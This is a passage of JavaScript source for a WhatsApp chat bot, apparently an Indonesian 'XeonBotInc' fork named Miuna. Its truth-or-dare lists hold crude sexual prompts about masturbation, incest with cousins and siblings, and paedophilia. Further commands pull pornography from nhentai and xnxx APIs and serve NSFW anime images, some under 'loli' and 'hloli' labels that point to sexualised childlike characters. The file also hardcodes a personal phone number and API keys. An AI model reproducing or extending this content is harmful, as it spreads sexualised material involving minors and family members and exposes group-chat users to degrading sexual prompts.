	 "Selamat , anda mendapatkan custom Role!\nSilahkan chat Owner bot Jika ingin mengclaim rolenya(Hadiah ini tidak berlaku jika anda telah mendapatkan custom role)",
	 "katakan *AKU GAY* Kebapakmu",
	 "jikalau kamu dipaksa untuk meng NTR antara istri pahlawan dan raja, mana yg kamu pilih?",
         "Katakan MAMAT PEDO"
     ]
                   const XeonBotIncdareww = dare[Math.floor(Math.random() * dare.length)]
                   buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
                   XeonBotInc.sendMessage(from, { image: buffer, caption: '*tidak melakukan tantangannya ? potong ae tu titid!!!*\n\n\nTantangannya : '+ XeonBotIncdareww }, {quoted:m})
                   break
                       

case 'kebenaran':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
const truth =[
                 "pernahkah coli dengan gambar keluarga sendiri?",
                 "Sehari Crot Berapa kali?",
                 "Biasanya Coli pake bahan apaan ?",
                 "Kamu Gay Ya ?",
                 "Apakah kamu pernah mencoba untuk menyepong titid kamu sendiri?",
                 "Pernah Nyewa lonte?",
                 "Apa yang membuatmu ketagihan coli ?",
                 "Kalo diajak mamat(anemone) ngewe , apakah kamu mau ?", 
                 "apakah kamu pengidap pedofil akut ?",
		 "jika Kamu disuruh Tetanggamu untuk mengentot istrinya, apakah kamu akan MemBRUTALin istrinya sampai pagi?",
		"Pernah kepergok lagi coli?",
		"Apakah kamu ingin berhenti coli ?",
"_Selamat anda mendapatkan Sebuah link Pemersatu Bangsa_ \nhttps://mega.nz/folder/MhdiEKSB#htmMZNkdYkuORkAxkxpOuw ",
"_Apakah anda pernah mengENTOD/Dientod sepupu anda?",
"_Apakah Anda mau jika diajak Sepupu/Kakak untuk Melakukan Enjos Enjos?_",
"_Jika anda mati dan bereinkarnasi ke isekai , apa yang akan anda lakukan di isekai?_\n*kalo gw sih ngentotin heroin yang punya tt gede:v*",
"_Pernahkah anda mencoba untuk menyepong titid anda sendiri?_",
"_Jika saat ini lagi berkumpul bersama keluarga, dan tiba tiba anda ingin coli. apakah yang anda lakukan?_",
"*Gatau, pengen beli truk*",
"Sebulan berapa kali cukur jembud?",
"Apa yang antum lakukan ketika ingin membahagiakan orang tua antum?",
"Capek ga jadi beban orang tua?",
"Pernah liat Sepupu/Kakak/adek telanjang tanpa sehelai benang? dan jika pernah, apa yang antum lakukan? langsung coli? akwokaokawo", 
"Gatau bang mo ngasih pertanyaan apa, bingung gweh",
"Pernah makan jembud?", 
"Selamat , anda mendapatkan custom Role!\nSilahkan chat Owner bot Jika ingin mengclaim rolenya(Hadiah ini tidak berlaku jika anda telah mendapatkan custom role sebelumnya)",
"Selamat! anda mendapatkan lonT kualitas premium https://telegra.ph/file/6833783a65e584073d294.jpg ",
"Tar dulu , gw pengen ngentot"
                 
             ]
                           const XeonBotInctruthww = truth[Math.floor(Math.random() * truth.length)]
                           buffer = await getBuffer(`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)
                           XeonBotInc.sendMessage(from, { image: buffer, caption: '*Gajawab mandul*\n\n'+ XeonBotInctruthww }, {quoted:m})
                           break




case 'mediafire': case 'mediafiredl': {
	if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (!text) return reply(mess.linkm)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `「  *Mediafire Downloader*  」
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break

case 'report':{
if (!args.join(" ")) return reply (`Contoh : *-report Fitur Nhentai Rusak bang*`)
let text = `${args.join(" ")}\n\n${m.sender}`
XeonBotInc.sendMessage(`6285161888973@s.whatsapp.net`, {text : text},{quoted : fvn})
reply (`Laporan mu sudah diterima owner. Terima Kasih.\n\nPerlu di Ingat! Jika kamu hanya iseng saja, Maka kamu bakalan diblokir oleh Owner Sehingga kamu tidak bisa menggunakan Bot lagi.`)
}
break
case 'donatur':{
let text = `ɪɴɢɪɴ ᴍᴇɴᴊᴀᴅɪ ᴅᴏɴᴀᴛᴜʀ?
ᴄᴀʀᴀɴʏᴀ ᴄᴜᴋᴜᴘ ᴍᴜᴅᴀʜ ᴋᴀᴋ.
ᴋɪʀɪᴍ ᴅᴏɴᴀsɪ ᴅᴇɴɢᴀɴ ɴᴏᴍɪɴᴀʟ sᴇɪʜᴋʟᴀsɴʏᴀ ᴋᴇ ɴᴏᴍᴇʀ 𝟶𝟾𝟻𝟷𝟼𝟷𝟾𝟾𝟾𝟿𝟽𝟹 ʙɪsᴀ ᴠɪᴀ ᴅᴀɴᴀ/ᴏᴠᴏ/ɢᴏᴘᴀʏ.
ᴊɪᴋᴀ sᴜᴅᴀʜ sɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ᴋᴇ ɴᴏᴍᴇʀ ᴡʜᴀᴛsᴀᴘᴘ ᴡᴀ.ᴍᴇ/𝟼𝟸𝟾𝟻𝟷𝟼𝟷𝟾𝟾𝟾𝟿𝟽𝟹 ᴅᴀɴ ᴋɪʀɪᴍ ʙᴜᴋᴛɪ ᴛʀᴀɴsғᴇʀɴʏᴀ.
ᴅᴇɴɢᴀɴ ᴍᴇɴᴅᴏɴᴀsɪᴋᴀɴ sᴇᴅɪᴋɪᴛ ʀᴇᴢᴇᴋɪᴍᴜ ᴍᴀᴋᴀ ᴋᴇʜɪᴅᴜᴘᴀɴ ʙᴏᴛ ᴅᴀɴ ᴏᴡɴᴇʀ ᴀᴋᴀɴ sᴀɴɢᴀᴛ ᴛᴇʀʙᴀɴᴛᴜ.
ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ʙᴜᴀᴛ ʏᴀɴɢ sᴜᴅᴀʜ ᴅᴏɴᴀsɪ, sᴇᴍᴏɢᴀ ʀᴇᴢᴇᴋɪᴍᴜ ᴅɪʟɪᴘᴀᴛ ɢᴀɴᴅᴀᴋᴀɴ ᴏʟᴇʜ ʏᴀɴɢ ᴍᴀʜᴀ ᴋᴜᴀsᴀ.

ᴀᴘᴀ sᴀᴊᴀ ᴋᴇᴜɴᴛᴜɴɢᴀɴ ᴍᴇɴᴊᴀᴅɪ ᴅᴏɴᴀᴛᴜʀ?
𝟷. ʙɪsᴀ ʀᴇǫᴜᴇsᴛ ʀᴏʟᴇ sᴇsᴜᴋᴀ ʜᴀᴛɪ. ᴋᴇᴛɪᴋ *-ᴘʀᴏғɪʟᴇ* ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʀᴏʟᴇ ᴀɴᴅᴀ.
𝟸. ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴇᴍᴜᴀ ғɪᴛᴜʀ ᴍɪᴜɴᴀ ʙᴏᴛ(ᴛᴇʀᴍᴀsᴜᴋ ғɪᴛᴜʀ ᴅᴏɴᴀᴛᴜʀ),ᴋᴇᴄᴜᴀʟɪ ғɪᴛᴜʀ ᴏᴡɴᴇʀ.
𝟹. ʙɪsᴀ ᴍᴇɴɢᴜɴᴅᴀɴɢ ᴍɪᴜɴᴀ ʙᴏᴛ ᴋᴇᴅᴀʟᴀᴍ ɢʀᴏᴜᴘᴍᴜ.
𝟺. ʙɪsᴀ ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ (ʏᴀ ᴛᴇʀɢᴀɴᴛᴜɴɢ ᴋᴇᴍᴀᴍᴘᴜᴀɴ ᴏᴡɴᴇʀ ʙɪsᴀ ᴀᴛᴀᴜ ᴇɴɢɢᴀ:ᴠ)
ᴅᴀɴ ᴍᴀsɪʜ ʙᴀɴʏᴀᴋ ʟᴀɢɪ ᴜɴᴛᴜᴋ ᴋᴇᴅᴇᴘᴀɴɴʏᴀ!`

	let buttonMessage = {
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `ᴄᴀʀᴀ ᴍᴇɴᴊᴀᴅɪ ᴅᴏɴᴀᴛᴜʀ`,
	fileLength: 99999999999999,
	pageCount : 69696969,
	caption : text,
    footer : 'ᴍɪᴜɴᴀ',
    headerType : 4,
    }
 XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted : m})
}
break
case 'googledrive': case 'gdrive': {
if (!isMod) return reply (mess.mod)
if (!text) return reply ('ᴇʜᴍᴍ, ʟɪɴᴋɴʏᴀ?')
if (!isUrl(args[0]) && !args[0].includes('drive.google.com')) return reply(`ɪᴛᴜ sᴇᴘᴇʀᴛɪɴʏᴀ ʙᴜᴋᴀɴ ʟɪɴᴋ ɢᴏᴏɢʟᴇ ᴅʀɪᴠᴇ ɴʏᴀ ᴋᴀᴋ!`)
reply (mess.waiting)
let ri = await fetchJson(`https://malesin.xyz/gdrive?url=${args.join(" ")}`)
let teks = `ᴍɪᴜɴᴀ ɢᴏᴏɢʟᴇ ᴅʀɪᴠᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
ɴᴀᴍᴀ ғɪʟᴇ : ${ri.fileName}
ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${ri.fileSize}
ᴛɪᴘᴇ ғɪʟᴇ : ${ri.mimetype}
ᴅɪʀᴇᴄᴛ ᴅᴏᴡɴʟᴏᴀᴅ : ${ri.downloadUrl}

ᴊɪᴋᴀ ᴜᴋᴜʀᴀɴ ғɪʟᴇ ᴍᴇʟᴇʙɪʜɪ 𝟸𝟶𝟶ᴍʙ ,ᴍᴏʜᴏɴ ᴜɴᴛᴜᴋ ᴛɪᴅᴀᴋ ᴍᴇᴍᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅᴏᴡɴʟᴏᴀᴅ ᴅɪʙᴀᴡᴀʜ ɪɴɪ. ᴋᴀʀɴᴀ ʙᴏᴛ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ ʏᴀɴɢ ʙᴇʀᴜᴋᴜʀᴀɴ 𝟸𝟶𝟶ᴍʙ ᴋᴇ ᴀᴛᴀs, ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ!`
let but =[{buttonId : `${prefix}gdown ${args.join(" ")}` , buttonText: {displayText : `ᴅᴏᴡɴʟᴏᴀᴅ!`}, type : 1}]
let butmes ={
document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `${ri.fileName}`,
	fileLength: 99999999999999,
	pageCount: 69696969,
	caption : teks,
    footer : 'ᴍɪᴜɴᴀ',
    buttons : but,
    headerType : 4
}
XeonBotInc.sendMessage(m.chat, butmes,{quoted : m})
}
break
case 'gdown':{
if(!isMod) return reply(mess.mod)
let ri = await fetchJson(`https://malesin.xyz/gdrive?url=${args.join(" ")}`)
XeonBotInc.sendMessage(m.chat, {document: {url : ri.downloadUrl }, fileName : `${ri.fileName}`, mimetype: `${ri.mimetype}`})
}
break


case 'nhentai': case 'nh':{
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`Masukin kode nuklirnya!`)
reply(mess.waiting)
let ri = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${args[0]}?apikey=${lolkey}`)
let teks = `ᴍɪᴜɴᴀ ɴʜᴇɴᴛᴀɪ ʀᴇᴀᴅᴇʀ\n\nᴊᴜᴅᴜʟ : ${ri.result.title_romaji}\nᴊᴜᴅᴜʟ ʟᴀɪɴɴʏᴀ : ${ri.result.title_native}\n\nᴛᴀɢs : ${ri.result.tags}\n\nʙᴀᴄᴀ ᴏɴʟᴇɴ ᴛᴀɴᴘᴀ ᴠᴘɴ : ${ri.result.read}\n(ᴊɪᴋᴀ ʟɪɴᴋ 𝟺𝟶𝟺 ʙᴇʀᴀʀᴛɪ ʙᴇʟᴏᴍ ᴅɪʙᴇɴᴇʀɪɴ ᴀᴅᴍɪɴɴʏᴀ, ᴛᴜɴɢɢᴜ sᴀᴅᴊᴀ:ᴠ)`
let sections = []
const yy = {title : `ᴍɪᴜɴᴀ ɴʜᴇɴᴛᴀɪ ʀᴇᴀᴅᴇʀ`,
rows: [
{title: `Download PDF!`, rowId: `-nhentaipdf ${args[0]}`},
{title: `Halaman 1`, rowId: `-otsu ${ri.result.image[1]}`},
{title: `Halaman 2`, rowId: `-otsu ${ri.result.image[2]}`},
{title: `Halaman 3`, rowId: `-otsu ${ri.result.image[3]}`},
{title: `Halaman 4`, rowId: `-otsu ${ri.result.image[4]}`},
{title: `Halaman 5`, rowId: `-otsu ${ri.result.image[5]}`},
{title: `Halaman 6`, rowId: `-otsu ${ri.result.image[6]}`},
{title: `Halaman 7`, rowId: `-otsu ${ri.result.image[7]}`},
{title: `Halaman 8`, rowId: `-otsu ${ri.result.image[8]}`},
{title: `Halaman 9`, rowId: `-otsu ${ri.result.image[9]}`},
{title: `Halaman 10`, rowId: `-otsu ${ri.result.image[10]}`},
{title: `Halaman 11`, rowId: `-otsu ${ri.result.image[11]}`},
{title: `Halaman 12`, rowId: `-otsu ${ri.result.image[12]}`},
{title: `Halaman 13`, rowId: `-otsu ${ri.result.image[13]}`},
{title: `Halaman 14`, rowId: `-otsu ${ri.result.image[14]}`},
{title: `Halaman 15`, rowId: `-otsu ${ri.result.image[15]}`},
{title: `Halaman 16`, rowId: `-otsu ${ri.result.image[16]}`},
{title: `Halaman 17`, rowId: `-otsu ${ri.result.image[17]}`},
{title: `Halaman 18`, rowId: `-otsu ${ri.result.image[18]}`},
{title: `Halaman 19`, rowId: `-otsu ${ri.result.image[19]}`},
{title: `Halaman 20`, rowId: `-otsu ${ri.result.image[20]}`},
{title: `Halaman 21`, rowId: `-otsu ${ri.result.image[21]}`},
{title: `Halaman 22`, rowId: `-otsu ${ri.result.image[22]}`},
{title: `Halaman 23`, rowId: `-otsu ${ri.result.image[23]}`},
{title: `Halaman 24`, rowId: `-otsu ${ri.result.image[24]}`},
{title: `Halaman 25`, rowId: `-otsu ${ri.result.image[25]}`},
{title: `Halaman 26`, rowId: `-otsu ${ri.result.image[26]}`},
{title: `Halaman 27`, rowId: `-otsu ${ri.result.image[27]}`},
{title: `Halaman 28`, rowId: `-otsu ${ri.result.image[28]}`},
{title: `Halaman 29`, rowId: `-otsu ${ri.result.image[29]}`},
{title: `Halaman 30`, rowId: `-otsu ${ri.result.image[30]}`},
{title: `Halaman 31`, rowId: `-otsu ${ri.result.image[31]}`},
{title: `Halaman 32`, rowId: `-otsu ${ri.result.image[32]}`},
{title: `Halaman 33`, rowId: `-otsu ${ri.result.image[33]}`},
{title: `Halaman 34`, rowId: `-otsu ${ri.result.image[34]}`},
{title: `Halaman 35`, rowId: `-otsu ${ri.result.image[35]}`},
{title: `Halaman 36`, rowId: `-otsu ${ri.result.image[36]}`},
{title: `Halaman 37`, rowId: `-otsu ${ri.result.image[37]}`},
{title: `Halaman 38`, rowId: `-otsu ${ri.result.image[38]}`},
{title: `Halaman 39`, rowId: `-otsu ${ri.result.image[39]}`},
{title: `Halaman 40`, rowId: `-otsu ${ri.result.image[40]}`},
{title: `Halaman 41`, rowId: `-otsu ${ri.result.image[41]}`},
{title: `Halaman 42`, rowId: `-otsu ${ri.result.image[42]}`},
{title: `Halaman 43`, rowId: `-otsu ${ri.result.image[43]}`},
{title: `Halaman 44`, rowId: `-otsu ${ri.result.image[44]}`},
{title: `Halaman 45`, rowId: `-otsu ${ri.result.image[45]}`},
{title: `Halaman 46`, rowId: `-otsu ${ri.result.image[46]}`},
{title: `Halaman 47`, rowId: `-otsu ${ri.result.image[47]}`},
{title: `Halaman 40`, rowId: `-otsu ${ri.result.image[48]}`},
{title: `Halaman 49`, rowId: `-otsu ${ri.result.image[49]}`},
{title: `Halaman 50`, rowId: `-otsu ${ri.result.image[50]}`},
{title: `Halaman 51`, rowId: `-otsu ${ri.result.image[51]}`},
{title: `Halaman 52`, rowId: `-otsu ${ri.result.image[52]}`},
{title: `Halaman 53`, rowId: `-otsu ${ri.result.image[53]}`},
{title: `Halaman 54`, rowId: `-otsu ${ri.result.image[54]}`},
{title: `Halaman 55`, rowId: `-otsu ${ri.result.image[55]}`},
{title: `Halaman 56`, rowId: `-otsu ${ri.result.image[56]}`},
{title: `Halaman 57`, rowId: `-otsu ${ri.result.image[57]}`},
{title: `Halaman 58`, rowId: `-otsu ${ri.result.image[58]}`},
{title: `Halaman 59`, rowId: `-otsu ${ri.result.image[59]}`},
{title: `Halaman 60`, rowId: `-otsu ${ri.result.image[60]}`},
{title: `Halaman 61`, rowId: `-otsu ${ri.result.image[61]}`},
{title: `Halaman 62`, rowId: `-otsu ${ri.result.image[62]}`},
{title: `Halaman 63`, rowId: `-otsu ${ri.result.image[63]}`},
{title: `Halaman 64`, rowId: `-otsu ${ri.result.image[64]}`},
{title: `Halaman 65`, rowId: `-otsu ${ri.result.image[65]}`},
{title: `Halaman 66`, rowId: `-otsu ${ri.result.image[66]}`},
{title: `Halaman 67`, rowId: `-otsu ${ri.result.image[67]}`},
{title: `Halaman 68`, rowId: `-otsu ${ri.result.image[68]}`},
{title: `Halaman 69`, rowId: `-otsu ${ri.result.image[69]}`},
{title: `Halaman 70`, rowId: `-otsu ${ri.result.image[70]}`},
{title: `Halaman 71`, rowId: `-otsu ${ri.result.image[71]}`},
{title: `Halaman 72`, rowId: `-otsu ${ri.result.image[72]}`},
{title: `Halaman 73`, rowId: `-otsu ${ri.result.image[73]}`},
{title: `Halaman 74`, rowId: `-otsu ${ri.result.image[74]}`},
{title: `Halaman 75`, rowId: `-otsu ${ri.result.image[75]}`},
{title: `Halaman 76`, rowId: `-otsu ${ri.result.image[76]}`},
{title: `Halaman 78`, rowId: `-otsu ${ri.result.image[78]}`},
{title: `Halaman 79`, rowId: `-otsu ${ri.result.image[79]}`},
{title: `Halaman 80`, rowId: `-otsu ${ri.result.image[80]}`},
{title: `Halaman 81`, rowId: `-otsu ${ri.result.image[81]}`},
{title: `Halaman 82`, rowId: `-otsu ${ri.result.image[82]}`},
{title: `Halaman 83`, rowId: `-otsu ${ri.result.image[83]}`},
{title: `Halaman 84`, rowId: `-otsu ${ri.result.image[84]}`},
{title: `Halaman 85`, rowId: `-otsu ${ri.result.image[85]}`},
{title: `Halaman 86`, rowId: `-otsu ${ri.result.image[86]}`},
{title: `Halaman 87`, rowId: `-otsu ${ri.result.image[87]}`},
{title: `Halaman 88`, rowId: `-otsu ${ri.result.image[88]}`},
{title: `Halaman 89`, rowId: `-otsu ${ri.result.image[89]}`},
{title: `Halaman 90`, rowId: `-otsu ${ri.result.image[90]}`},
{title: `Halaman 91`, rowId: `-otsu ${ri.result.image[91]}`},
{title: `Halaman 92`, rowId: `-otsu ${ri.result.image[92]}`},
{title: `Halaman 93`, rowId: `-otsu ${ri.result.image[93]}`},
{title: `Halaman 94`, rowId: `-otsu ${ri.result.image[94]}`},
{title: `Halaman 95`, rowId: `-otsu ${ri.result.image[95]}`},
{title: `Halaman 96`, rowId: `-otsu ${ri.result.image[96]}`},
{title: `Halaman 97`, rowId: `-otsu ${ri.result.image[97]}`},
{title: `Halaman 98`, rowId: `-otsu ${ri.result.image[98]}`},
{title: `Halaman 99`, rowId: `-otsu ${ri.result.image[99]}`},
{title: `Halaman 100`, rowId: `-otsu ${ri.result.image[100]}`}

]}
sections.push(yy)
XeonBotInc.sendImage(m.chat, ri.result.image[0])
await sleep(1500)
XeonBotInc.sendMessage(from, { text: teks, buttonText: "ʙᴀᴄᴀ ᴅɪ ᴡᴀɴɢsᴀғ!!!",sections},{quoted : m})
}
break

case 'nhentaisearch': case 'nhs':{
if(!isMod) return reply (mess.mod)
if(!args[0]) return reply (`ᴅɪᴋɪʀᴀ sᴀʏᴀ ʙɪsᴀ ᴍᴇɴᴇʀᴀᴡᴀɴɢ ɪsɪ ᴏᴛᴀᴋᴍᴜ? ᴍɪɴɪᴍᴀʟ ᴊᴜᴅᴜʟ ʟᴀʜ!`)
if(args[0] === "miuna") return reply('Otw Block!')
if(args[0] === "shiodome miuna") return reply (`Cari sendiri ya!`)
reply(mess.waiting)
await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${lolkey}&query=${args.join(" ")}`)
.then((res) =>{
let sections = []   
  for (let i of res.result) {
  const list = {title: `${i.title_english}`,
  rows: [
	    {
	     title: `Kode Nuklir : ${i.id}`, 
	     rowId: `${prefix}nhentai ${i.id}`,
	     description: `Jumlah Halaman : ${i.page}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  XeonBotInc.sendMessage(
      from, 
      {
       text: `Nhentai Search!`,
       buttonText: `Hasil Pencarian!`,
       sections
      }, { quoted : m }
    )  
})
}
break
case 'otsu':{
if(!isMod) return reply(mess.mod)
if(!args[0]) return reply(`😳`)
if(args[0] === "undefined") { 
return reply (`ᴍᴜɴɢᴋɪɴ sᴜᴅᴀʜ ᴇɴᴅ ᴋᴀᴋ!`)
}
XeonBotInc.sendImage(m.chat, `${args.join(" ")}`)
}
break
case 'nhentaipdf': {
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!isMod) return reply(mess.mod)
if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
reply(mess.waiting)
henid = args[0]
d = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
 hasil = d.result
XeonBotInc.sendMessage(m.chat, { document : { url : hasil}, fileName : `${henid}.pdf`, mimetype: `application/pdf` })
}
break

case 'zippyshare': {
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if (!text) return reply(`linknya?`)
if (!isUrl(args[0]) && !args[0].includes('zippyshare.com')) return reply(`The link is not a zippyshare link`)
reply (`Sek...`)
link = args[0]
ri = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${link}`)
hasil = await getBuffer(ri.result.download_url)
XeonBotInc.sendMessage(m.chat, { document : hasil , fileName : `${ri.result.file_name}`, mimetype : `video/mp4`},{quoted : m})
}
break
case 'download':{
if (!isCreator) return reply (`...`)
let link = q.split('|')[0] ? q.split('|')[0] : q
let judul = q.split('|')[1] ? q.split('|')[1] : q
let mime = q.split('|')[2] ? q.split('|')[2] : ''
XeonBotInc.sendMessage (m.chat, {document : {url : link},fileName : `${judul}`, mimetype : `${mime}` })
}
break

case 'xnxxsearch': case 'xs' :{
if (!isMod) return reply (mess.mod)
if (!args.join(" ")) return reply (`ᴀɴᴜᴜ 👉👈, ᴊᴜᴅᴜʟɴʏᴀ ᴋᴀᴋ?`)
reply (mess.waiting)
await fetchJson(`https://oni-chan.my.id/api/adults/xnxx/search?query=${args.join(" ")}&apikey=istighfar`).then((res) =>{
let sections = []   
  for (let i of res.result.result) {
  const list = {title: `${i.title}`,
  rows: [
	    {
	     title: `Judul : ${i.title}`, 
	     rowId: `${prefix}xnxxdl ${i.link}`,
	     description: `Info : ${i.info}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  XeonBotInc.sendMessage(
      from, 
      {
       text: `「 xɴxx sᴇᴀʀᴄʜ ᴇɴɢɪɴᴇ 」\n\nᴋᴀʟᴏ ᴅᴜʀᴀsɪ 𝟷ᴊᴀᴍ ʟᴇʙɪʜ, ᴛᴏʟᴏɴɢ ᴊᴀɴɢᴀɴ ᴅɪᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟɴʏᴀ ʏᴀʜ, ɢᴀʙᴀᴋᴀʟ ʙɪsᴀ sᴏᴀʟɴʏᴀ:ᴠ`,
       buttonText: `Hasil!`,
       sections
      }, { quoted : m }
    )  
})
}
break

case 'xnxxdl':{
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`ᴇᴛᴛᴏᴏ 👉👈 , ʟɪɴᴋɴʏᴀ ᴋᴀᴋ?`)
reply (mess.waiting)
const links = args[0]
ri = await fetchJson(`https://oni-chan.my.id/api/adults/xnxx/download?link=${links}&apikey=istighfar`)
judul = ri.result.result.title
info = ri.result.result.info
const link = ri.result.result.files.high
cover = ri.result.result.files.thumbSlide
let teks = `    ᴍɪᴜɴᴀ xɴxx ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
ᴊᴜᴅᴜʟ : ${judul}
ɪɴғᴏ : ${info}`

let buttonMessage={
video :{url : link},
mimetype : "video/mp4",
caption : teks ,
footer : `ᴍɪᴜɴᴀ`,
headerType : 1
}
XeonBotInc.sendMessage(m.chat, buttonMessage ,{quoted : m}).catch((err) => {reply(`Web Error!`)})
}
break

case 'loli':
case 'waifu': {
if (isBan) return reply(mess.banned)	 
if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
await sleep(5000)
 ri = await fetchJson(`https://raw.githubusercontent.com/RiAdrianm/bakekok/main/SFW/${command}.json`)
 let asu = pickRandom(ri.result.image)
 let buttonkontol = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
  let gachatt = {
   image: {url: asu},
   caption:  `${ri.result.caption}`,
  buttons: buttonkontol,
  headerType: 1
  }      
XeonBotInc.sendMessage(m.chat, gachatt, { quoted:m })
}
break	

case 'pantat' :
case 'colmek' :
case 'ikku' :
case 'genshinimpact' :
case 'hloli' :
case 'nyepong':
case 'tusbol':
case 'pantsu' :
case 'oppai' :
case 'hXeonBotInc' :
case 'memew' :
case 'cwexcwe':
case 'hcosplay': {
if (isBan) return reply(mess.banned)	 
if (isBanChat) return reply(mess.bangc)
if (!m.isGroup) return replay(mess.grouponly)
if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
await sleep(5000)
 ri = await fetchJson(`https://raw.githubusercontent.com/RiAdrianm/bakekok/main/No%20Hentai%20No%20Life/${command}.json`)
 let asu = pickRandom(ri.result.image)
 let buttonkontol = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
  let gachatt = {
   image: {url: asu},
   caption:  `${ri.result.caption}`,
  buttons: buttonkontol,
  headerType: 1
  }      
XeonBotInc.sendMessage(m.chat, gachatt, { quoted:m })
}
break	


case 'hentaividio' : case 'hentaivid': case 'hentaivideo': {
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
await sleep(5000)
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul : ${result912.title}\nKategori : ${result912.category}\n$Mimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
}
break

case 'trap' :
    if (isBan) return reply(mess.banned)	 		
    if (!AntiNsfw) return reply (mess.nonsfw)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
await sleep(5000)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `-dongnasi`, buttonText: {displayText: `Bantu Bot Agar Tetap Hidup!`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ini dia...`,
  buttons: trapbot,
  headerType: 1
  }   
            await XeonBotInc.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break


case 'sagiri': case 'yotsuba':
case 'shinomiya': case 'tejina':
case 'chiho': case 'kaori':
case 'kotori': case 'akiyama':
case 'gremory': case 'isuzu': 
case 'shina': case 'elaina':
case 'shinka': case 'hinata':
case 'nezuko': case 'asuna':
case 'chitoge': case 'hestia':
case 'inori': 
{
if(isBan) return reply (mess.ban)
let sagirilont = `https://revita.herokuapp.com/api/wallpaper/${command}?apikey=ApiRevita`
let butjem = [{ buttonId : `${prefix}dongnasi`, buttonText : {displayText : 'Bantu Bot Agar Tetap Hidup!'}, type: 1}]
let jembut ={
image : {url : sagirilont},
caption : `${command} Kawai`,
footer : 'ᴍɪᴜɴᴀ',
buttons : butjem,
headerType : 4
}
await sleep(10000)
XeonBotInc.sendMessage(m.chat, jembut,{quoted : m})
}	
break
		
		
		
		

                case 'chiisaihentai':
                case 'trap':
                case 'yaoi':
                case 'ecchi':
                case 'hentay':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
 		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Silahkeun!"}, {quoted:m})
break
		case 'ketec':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/animearmpits?apikey=${lolkey}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Jilat noh ketec"}, {quoted:m})
break
	
		case 'milfu':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/milf?apikey=${lolkey}`
